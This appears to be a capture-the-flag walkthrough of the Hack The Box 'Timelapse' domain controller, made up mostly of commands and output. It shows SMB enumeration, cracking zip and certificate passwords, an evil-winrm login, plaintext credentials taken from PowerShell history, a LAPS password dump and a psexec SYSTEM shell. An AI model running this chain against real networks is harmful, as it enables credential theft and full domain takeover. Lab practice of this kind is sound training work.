

## IP/Name
### Initial access
Port scan
```bash
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-09-23 13:28:58Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: timelapse.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: timelapse.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5986/tcp  open  ssl/wsmans?   syn-ack ttl 127
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: 2026-09-23T13:30:51+00:00; +7h58m28s from scanner time.
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Issuer: commonName=dc01.timelapse.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-10-25T14:05:29
| Not valid after:  2022-10-25T14:25:29
| MD5:     e233 a199 4504 0859 013f b9c5 e4f6 91c3
| SHA-1:   5861 acf7 76b8 703f d01e e25d fc7c 9952 a447 7652
| SHA-256: ec04 c023 ef31 4e12 e299 0242 ef00 9045 7626 19ff 2c75 0f04 9779 0f98 118f e81d
| -----BEGIN CERTIFICATE-----
| MIIDCjCCAfKgAwIBAgIQLRY/feXALoZCPZtUeyiC4DANBgkqhkiG9w0BAQsFADAd
| MRswGQYDVQQDDBJkYzAxLnRpbWVsYXBzZS5odGIwHhcNMjExMDI1MTQwNTI5WhcN
| MjIxMDI1MTQyNTI5WjAdMRswGQYDVQQDDBJkYzAxLnRpbWVsYXBzZS5odGIwggEi
| MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDJdoIQMYt47skzf17SI7M8jubO
| rD6sHg8yZw0YXKumOd5zofcSBPHfC1d/jtcHjGSsc5dQQ66qnlwdlOvifNW/KcaX
| LqNmzjhwL49UGUw0MAMPAyi1hcYP6LG0dkU84zNuoNMprMpzya3+aU1u7YpQ6Dui
| AzNKPa+6zJzPSMkg/TlUuSN4LjnSgIV6xKBc1qhVYDEyTUsHZUgkIYtN0+zvwpU5
| isiwyp9M4RYZbxe0xecW39hfTvec++94VYkH4uO+ITtpmZ5OVvWOCpqagznTSXTg
| FFuSYQTSjqYDwxPXHTK+/GAlq3uUWQYGdNeVMEZt+8EIEmyL4i4ToPkqjPF1AgMB
| AAGjRjBEMA4GA1UdDwEB/wQEAwIFoDATBgNVHSUEDDAKBggrBgEFBQcDATAdBgNV
| HQ4EFgQUZ6PTTN1pEmDFD6YXfQ1tfTnXde0wDQYJKoZIhvcNAQELBQADggEBAL2Y
| /57FBUBLqUKZKp+P0vtbUAD0+J7bg4m/1tAHcN6Cf89KwRSkRLdq++RWaQk9CKIU
| 4g3M3stTWCnMf1CgXax+WeuTpzGmITLeVA6L8I2FaIgNdFVQGIG1nAn1UpYueR/H
| NTIVjMPA93XR1JLsW601WV6eUI/q7t6e52sAADECjsnG1p37NjNbmTwHabrUVjBK
| 6Luol+v2QtqP6nY4DRH+XSk6xDaxjfwd5qN7DvSpdoz09+2ffrFuQkxxs6Pp8bQE
| 5GJ+aSfE+xua2vpYyyGxO0Or1J2YA1CXMijise2tp+m9JBQ1wJ2suUS2wGv1Tvyh
| lrrndm32+d0YeP/wb8E=
|_-----END CERTIFICATE-----
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49687/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49697/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-09-23T13:30:13
|_  start_date: N/A
|_clock-skew: mean: 7h58m27s, deviation: 0s, median: 7h58m26s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 38738/tcp): CLEAN (Timeout)
|   Check 2 (port 12117/tcp): CLEAN (Timeout)
|   Check 3 (port 43455/udp): CLEAN (Timeout)
|   Check 4 (port 24253/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required


```
subdomain scan
dirscan
filescan
SMB recon
```
──(kali㉿kali)-[~/HTB/Timelapse]
└─$ smbclient -L //10.129.227.113/Shares -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Shares          Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
^[[Ado_connect: Connection to 10.129.227.113 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/HTB/Timelapse]
└─$ smbclient  //10.129.227.113/Shares -N 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Oct 25 11:39:15 2021
  ..                                  D        0  Mon Oct 25 11:39:15 2021
  Dev                                 D        0  Mon Oct 25 15:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 11:48:42 2021

                6367231 blocks of size 4096. 1277306 blocks available
smb: \> cd dev
smb: \dev\> ls
  .                                   D        0  Mon Oct 25 15:40:06 2021
  ..                                  D        0  Mon Oct 25 15:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 11:46:42 2021

                6367231 blocks of size 4096. 1277306 blocks available
smb: \dev\> mget*
mget*: command not found
smb: \dev\> mget *
Get file winrm_backup.zip? y
getting file \dev\winrm_backup.zip of size 2611 as winrm_backup.zip (3.2 KiloBytes/sec) (average 3.2 KiloBytes/sec)
smb: \dev\> cd ..
smb: \> ls
  .                                   D        0  Mon Oct 25 11:39:15 2021
  ..                                  D        0  Mon Oct 25 11:39:15 2021
  Dev                                 D        0  Mon Oct 25 15:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 11:48:42 2021

                6367231 blocks of size 4096. 1277210 blocks available
smb: \> cd HelpDesk
smb: \HelpDesk\> ls
  .                                   D        0  Mon Oct 25 11:48:42 2021
  ..                                  D        0  Mon Oct 25 11:48:42 2021
  LAPS.x64.msi                        A  1118208  Mon Oct 25 10:57:50 2021
  LAPS_Datasheet.docx                 A   104422  Mon Oct 25 10:57:46 2021
  LAPS_OperationsGuide.docx           A   641378  Mon Oct 25 10:57:40 2021
  LAPS_TechnicalSpecification.docx      A    72683  Mon Oct 25 10:57:44 2021

                6367231 blocks of size 4096. 1277210 blocks available
smb: \HelpDesk\> 

```

Read zip file
```
┌──(kali㉿kali)-[~/HTB/Timelapse]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     
1g 0:00:00:00 DONE (2026-09-23 01:34) 4.347g/s 15101Kp/s 15101Kc/s 15101KC/s suzyqzb..superkebab
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                  
```
We crack pfx file
```
┌──(kali㉿kali)-[~/HTB/Timelapse]
└─$ pfx2john legacyy_dev_auth.pfx > pfx.hash

                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/HTB/Timelapse]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt pfx.hash

Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 512/512 AVX512BW 16x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thuglegacy       (legacyy_dev_auth.pfx)     
1g 0:00:00:08 DONE (2026-09-23 01:36) 0.1187g/s 383817p/s 383817c/s 383817C/s thyriana..thsco04
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```
We create  crt to get evilwinrm access
```
┌──(kali㉿kali)-[~/HTB/Timelapse]
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -info -noout     

Enter Import Password:
MAC: sha1, Iteration 2000
MAC length: 20, salt length: 20
PKCS7 Data
Shrouded Keybag: pbeWithSHA1And3-KeyTripleDES-CBC, Iteration 2000
PKCS7 Data
Certificate bag
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/HTB/Timelapse]
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out private.key -nodes

Enter Import Password:
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/HTB/Timelapse]
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out certificate.crt

Enter Import Password:
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/HTB/Timelapse]
└─$ evil-winrm -i 10.129.227.113 -c certificate.crt -k private.key -S

                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\legacyy\Documents> 


```
Read PS history
```
*Evil-WinRM* PS C:\Users\legacyy\desktop> cat  C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_History.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit

```

We have cred `svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV`
Run bloodhoud see that user have right to read pass LAPS (`ms-mcs-admpwd`)
```
┌──(kali㉿kali)-[~/HTB/Timelapse]
└─$ nxc ldap 10.129.227.113 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -M laps

/usr/lib/python3/dist-packages/lsassy/impacketfile.py:90: SyntaxWarning: 'return' in a 'finally' block
  return True
LDAP        10.129.227.113  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:timelapse.htb)
LDAP        10.129.227.113  389    DC01             [+] timelapse.htb\svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV 
LAPS        10.129.227.113  389    DC01             [*] Getting LAPS Passwords
LAPS        10.129.227.113  389    DC01             Computer:DC01$ User:                Password:6Dx%26a;UZU7d9L4gxwK-3B{

```
### Lateral Movement
### Priv escalation
```
┌──(kali㉿kali)-[~/HTB/Timelapse]
└─$ impacket-psexec timelapse.htb/Administrator:'6Dx%26a;UZU7d9L4gxwK-3B{'@10.129.227.113

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.227.113.....
[*] Found writable share ADMIN$
[*] Uploading file aDjUWbxv.exe
[*] Opening SVCManager on 10.129.227.113.....
[*] Creating service RfkV on 10.129.227.113.....
[*] Starting service RfkV.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2686]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system


```
### 